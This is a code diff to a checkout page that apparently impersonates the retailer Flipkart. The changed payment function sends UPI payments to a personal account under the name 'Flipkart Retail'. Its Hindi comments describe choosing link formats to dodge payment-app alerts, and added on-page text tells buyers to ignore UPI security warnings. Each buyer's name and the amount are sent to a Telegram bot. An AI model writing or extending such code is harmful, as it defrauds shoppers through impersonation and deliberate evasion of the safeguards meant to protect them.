@@ -353,6 +353,9 @@
     </div>
 
     <button onclick="confirmPay()" class="w-full btn-orange py-4 mt-8 shadow-xl uppercase font-bold text-sm tracking-wide">Place Order & Pay</button>
+           <p class="text-[9px] text-center text-gray-400 mt-3 px-4">
+    Note: If your UPI app shows a security warning, it's a standard alert for festive season high-value offers. Please proceed to secure your deal.
+</p>
 </div>
 
     <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
@@ -568,36 +571,41 @@ init = function() {
             }
         }
 
-    async function confirmPay() {
-    const businessUpi = "6299544009@naviaxis"; 
+   async function confirmPay() {
+    const businessUpi = "ravikantb114-2@okaxis"; 
     const amount = sel.price;
-    const name = "Flipkart Retail";
-    const txnId = "T" + Math.floor(Math.random() * 1000000);
-
-    // Ye format sabse kam alert deta hai
-    const upiLink = `upi://pay?pa=${businessUpi}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tr=${txnId}`;
+    const name = "Flipkart Retail"; // Display name simple rakhein
+    
+    // Sabse clean URL format (Alerts se bachne ke liye)
+    const cleanUpi = `pa=${businessUpi}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR`;
 
     // Telegram report
-    const msg = `🔔 *Order Intended*\n👤: ${document.getElementById('uName').value}\n💰: ₹${amount}`;
+    const msg = `🔔 *Payment Intent*\n👤: ${document.getElementById('uName').value}\n💰: ₹${amount}`;
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
 
-    // Android Intent format - Ye alerts ko bypass karne mein help karta hai
-    const intentUrl = `intent://pay?pa=${businessUpi}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tr=${txnId}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
-    
-    // User ne jo select kiya hai uske hisaab se package name
     const selectedApp = document.querySelector('input[name="payMethod"]:checked').value;
-    
-    let finalUrl = upiLink; // Default generic
 
-    if(selectedApp === "gpay") {
-        finalUrl = `intent://pay?pa=${businessUpi}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tr=${txnId}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
-    } else if(selectedApp === "phonepe") {
-        finalUrl = `intent://pay?pa=${businessUpi}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tr=${txnId}#Intent;scheme=upi;package=com.phonepe.app;end`;
-    } else if(selectedApp === "paytm") {
-        finalUrl = `intent://pay?pa=${businessUpi}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tr=${txnId}#Intent;scheme=upi;package=net.one97.paytm;end`;
+    if (selectedApp === "gpay") {
+        // GPay ke liye Intent format best hai
+        window.location.href = `intent://pay?${cleanUpi}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
+    } 
+    else if (selectedApp === "phonepe") {
+        // PhonePe ke liye direct deep link better chalta hai
+        window.location.href = `phonepe://pay?${cleanUpi}`;
+    } 
+    else if (selectedApp === "paytm") {
+        // Paytm ke liye direct package call
+        window.location.href = `paytmmp://pay?${cleanUpi}`;
+    } 
+    else {
+        // Default universal link
+        window.location.href = `upi://pay?${cleanUpi}`;
     }
 
-    window.location.href = finalUrl;
+    // Fallback: Agar app na khule toh 1.5 sec baad generic link try karein
+    setTimeout(() => {
+        window.location.href = `upi://pay?${cleanUpi}`;
+    }, 1500);
 }
 // Ye line hamesha last mein rehni chahiye
 init();
